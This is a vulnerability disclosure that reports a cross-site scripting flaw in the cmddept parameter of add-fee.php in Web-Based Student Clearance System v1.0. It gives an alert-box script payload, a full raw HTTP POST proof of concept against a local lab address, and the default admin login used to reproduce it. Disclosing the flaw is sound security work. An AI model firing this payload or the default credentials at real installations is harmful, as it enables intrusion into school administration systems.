## Vulnerability Description

[Web-Based Student Clearance System v1.0](https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html) was discovered to contain a cross-site scripting (XSS) vulnerability via the add-fee.php. It is an open source project from [https://www.sourcecodester.com/](https://www.sourcecodester.com/). This vulnerability allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the cmddept parameter.

1. BUG_Author: Tr0e
  
2. vendors: [Web-Based Student Clearance System in PHP Free Source Code](https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html);
  
3. The program is built using the xmapp/v3.3.0 and PHP/8.1.10 version;
  
4. Vulnerability location: /student_clearance_system_Aurthur_Javis/admin/add-fee.php
  

# Vulnerability Verification

[+] Payload:

```java
"><script>alert(1)</script>
```

POC：

```js
POST http://192.168.0.111:91/student_clearance_system_Aurthur_Javis/admin/add-fee.php HTTP/1.1
Host: 192.168.0.111:91
Content-Length: 122
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.111:91
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.111:91/student_clearance_system_Aurthur_Javis/admin/add-fee.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=rbcvgagjbbad1bbrbb62nukgmc
Connection: close

cmdsession=2020%2F2021&cmdfaculty=Select+faculty&cmddept=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&txtamt=2000&btnAdd=
```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author (Log in with the default account and password:admin/admin123) and execute the Payload provided above.

The vulnerability is located at the "Fee Management - Add Fee" function, you shuold inserts Payload when you add new file，as shown in the following figure：
![image](https://user-images.githubusercontent.com/42080954/194541458-11332707-3261-4379-a257-909aee1e4048.png)
![image](https://user-images.githubusercontent.com/42080954/194541554-7b25bb74-0c17-4dad-a91f-ddf0a95b66a0.png)
![image](https://user-images.githubusercontent.com/42080954/194541621-a31a6cf2-bad7-447c-a354-4e500bf50770.png)
![image](https://user-images.githubusercontent.com/42080954/194541985-a4a84d09-65ff-4bce-806a-1cc573996dc9.png)


